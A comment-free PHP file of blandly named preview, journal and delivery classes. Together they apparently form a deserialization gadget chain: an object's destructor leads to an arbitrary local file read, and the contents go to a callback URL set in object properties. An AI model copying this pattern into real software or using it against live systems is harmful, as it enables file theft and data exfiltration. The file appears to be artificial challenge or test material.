<?php

declare(strict_types=1);

final class PreviewBatch
{
    public array $items = [];
    public ?DeliveryJournal $journal = null;
    public array $profile = [];
    public string $state = 'draft';

    public function __destruct()
    {
        if ($this->state !== 'sealed' || $this->journal === null) {
            return;
        }
        $this->journal->flush($this->profile, $this->items);
    }
}

final class DeliveryJournal
{
    private ?DeliveryTarget $target = null;
    public bool $armed = false;
    public string $channel = 'summary';

    public function __construct(?DeliveryTarget $target = null)
    {
        $this->target = $target;
    }

    public function flush(array $profile, array $items): void
    {
        if (!$this->armed || $this->target === null) {
            return;
        }
        $channel = is_string($profile['channel'] ?? null) ? $profile['channel'] : $this->channel;
        foreach ($items as $item) {
            $body = (string) $item;
            if ($body !== '') {
                $this->target->publish($channel, $profile, $body);
            }
        }
    }
}

final class PreviewEnvelope
{
    public SnippetLayout $layout;
    public array $meta = [];

    public function __toString(): string
    {
        return $this->layout->compose($this->meta);
    }
}

final class SnippetLayout
{
    public SnapshotView $view;
    public string $wrapper = '{{body}}';

    public function compose(array $meta): string
    {
        $body = $this->view->render($meta);
        if ($body === '') {
            return '';
        }
        if (!str_contains($this->wrapper, '{{body}}')) {
            return $body . $this->wrapper;
        }
        return str_replace('{{body}}', $body, $this->wrapper);
    }
}

final class SnapshotView
{
    protected AssetCatalog $catalog;
    public string $expected = 'digest';
    public string $slot = 'summary';
    public string $field = 'path';

    public function __construct(AssetCatalog $catalog)
    {
        $this->catalog = $catalog;
    }

    public function render(array $meta): string
    {
        if (($meta['variant'] ?? '') !== $this->expected) {
            return '';
        }
        $path = is_string($meta[$this->field] ?? null) ? $meta[$this->field] : '';
        if ($path === '') {
            return '';
        }
        $slot = is_string($meta['slot'] ?? null) ? $meta['slot'] : $this->slot;
        $store = $this->catalog->open($slot);
        return $store?->pull($path) ?? '';
    }
}

final class AssetCatalog
{
    private array $stores = [];
    public string $fallback = 'summary';

    public function open(string $slot): ?LocalAssetStore
    {
        $store = $this->stores[$slot] ?? $this->stores[$this->fallback] ?? null;
        return $store instanceof LocalAssetStore ? $store : null;
    }
}

final class LocalAssetStore
{
    private string $root = '/srv/review-cache';
    public string $prefix = '';

    public function pull(string $path): string
    {
        return (string) @file_get_contents($this->root . $this->prefix . $path);
    }
}

final class DeliveryTarget
{
    private ?IntegrationRelay $relay = null;
    public string $field = 'preview';
    public string $expectedChannel = 'summary';

    public function __construct(?IntegrationRelay $relay = null)
    {
        $this->relay = $relay;
    }

    public function publish(string $channel, array $profile, string $body): void
    {
        if ($this->relay === null || $body === '' || $channel !== $this->expectedChannel) {
            return;
        }
        $endpoint = is_string($profile['callback'] ?? null) ? $profile['callback'] : '';
        if ($endpoint === '') {
            return;
        }
        $this->relay->dispatch($endpoint, $this->field, $body);
    }
}

final class IntegrationRelay
{
    public string $scheme = 'http';

    public function dispatch(string $endpoint, string $field, string $body): void
    {
        if ($body === '' || !preg_match('#^https?://#', $endpoint)) {
            return;
        }
        $joiner = str_contains($endpoint, '?') ? '&' : '?';
        @file_get_contents($endpoint . $joiner . $field . '=' . rawurlencode($body));
    }
}
